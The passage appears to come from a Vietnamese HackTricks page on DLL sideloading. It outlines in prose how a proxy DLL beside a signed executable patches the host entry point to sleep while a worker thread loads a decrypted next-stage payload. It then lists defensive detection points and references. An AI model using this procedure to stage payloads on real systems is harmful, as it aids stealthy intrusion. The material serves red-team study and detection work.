- Đưa main thread vào trạng thái chờ bằng `Sleep(INFINITE)` là cách đơn giản để giữ tiến trình đã ký hoạt động trong khi loader giải mã, staging hoặc khởi tạo kết nối mạng trong worker thread.
- Chỉ tìm kiếm `DllMain` đáng ngờ có thể bỏ sót mẫu này nếu hành vi đáng chú ý diễn ra sau khi entry point của host bị patch và một thread phụ bắt đầu chạy.

Quy trình tối thiểu
1. Sao chép EXE đã ký của host và xác định DLL mà EXE phân giải từ thư mục cục bộ.
2. Tạo một proxy DLL export các hàm tương tự và forward chúng đến DLL hợp pháp.
3. Trong `DllMain(DLL_PROCESS_ATTACH)`, tạo một worker thread.
4. Từ thread đó, patch entry point của host hoặc routine khởi chạy main thread để nó lặp trên `Sleep`.
5. Giải mã tên/config của DLL ở giai đoạn tiếp theo rồi gọi `LoadLibrary` hoặc manual-map payload.

Các điểm cần tập trung khi phòng thủ
- Các tiến trình đã ký tải `version.dll` hoặc các thư viện phổ biến tương tự từ thư mục ứng dụng của chính chúng thay vì từ `System32`.
- Các memory patch tại entry point của tiến trình ngay sau khi image được tải, đặc biệt là các jump/call được chuyển hướng đến `Sleep`/`SleepEx`.
- Các thread do proxy DLL tạo ra, ngay lập tức gọi `LoadLibrary` trên DLL thứ hai có tên đã giải mã.
- Các proxy DLL có đầy đủ export được đặt cạnh executable của nhà cung cấp trong các thư mục staging có quyền ghi, chẳng hạn `ProgramData`, `%TEMP%` hoặc đường dẫn chứa archive đã giải nén.

## References

- [1] [Red Canary – Thông tin chuyên sâu về tình báo: Tháng 1 năm 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Leo thang đặc quyền bằng TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking trong Windows. Ví dụ C đơn giản.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore triển khai malware mới nhắm mục tiêu vào châu Âu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Khi DLL Hijack kết hợp với Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Bản sao kỹ thuật số: Phân tích cấu trúc các chiến dịch mạo danh đang biến đổi, phát tán Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Lợi ích hội tụ: Phân tích các cụm mối đe dọa nhắm mục tiêu vào một chính phủ Đông Nam Á](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng lưới chuyển tiếp và cách thức hoạt động bên trong của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Phân tích sâu bộ công cụ của Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Chuỗi HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Theo dõi các chiến dịch gián điệp năm 2026 của APT Iran Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Phần tử `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Phần tử `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Phần tử `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Phần tử `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Phần tử `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Phần tử `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Nhanh và quyết liệt: Hoạt động của Nimbus Manticore trong xung đột Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Tác vụ Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nhắm mục tiêu vào các chính phủ và cơ sở hạ tầng trọng yếu ở Đông Nam Á](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Tái dựng và phát hiện DLL Search-Order Hijacking trên Windows bằng Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Xây dựng thư viện native bằng Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports với Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Thứ tự tìm kiếm dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Định dạng PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Phát hiện biến thể SectopRAT được nhúng trong phần mềm hợp pháp](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Đánh cắp LIGHTSHOW (Phần Một)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Chiến dịch FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Framework tải .NET dựa trên XAML NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
